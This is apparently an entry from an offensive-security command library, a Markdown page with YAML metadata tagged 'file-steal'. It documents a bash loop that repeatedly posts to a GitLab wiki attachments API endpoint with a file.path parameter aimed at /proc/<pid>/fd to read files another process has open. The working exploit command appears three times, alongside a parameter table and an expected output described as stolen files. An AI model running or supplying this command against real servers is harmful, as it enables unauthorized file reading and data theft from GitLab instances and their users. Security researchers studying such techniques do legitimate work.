---
data: >-
  while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44'
  -F '[file]=@/tmp/lala.txt' | grep file_name; done
tags:
  - loop
  - file-steal
type: command
executor: bash
platforms:
  - Linux
id: e30d4982-cd1d-42c7-a57b-3b825beaf534
created_at: '2025-12-11T03:47:39.399Z'
updated_at: '2025-12-11T03:47:39.399Z'
verified: false
validated: true
submitted: true
---
# curl-loop-steal-fd

## Command

```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

## Description

Loops requests to steal files via fd.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `while true; do` | Infinite loop | Yes |
| `-s` | Silent | Yes |
| `| grep file_name` | Filter | Yes |

## Examples

### Basic Usage

```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

## Expected Output

JSON with file_name from stolen files.

## Related
- [[procedures/Steal-Inflight-Files-Using-/proc/fd-in-Loop]]
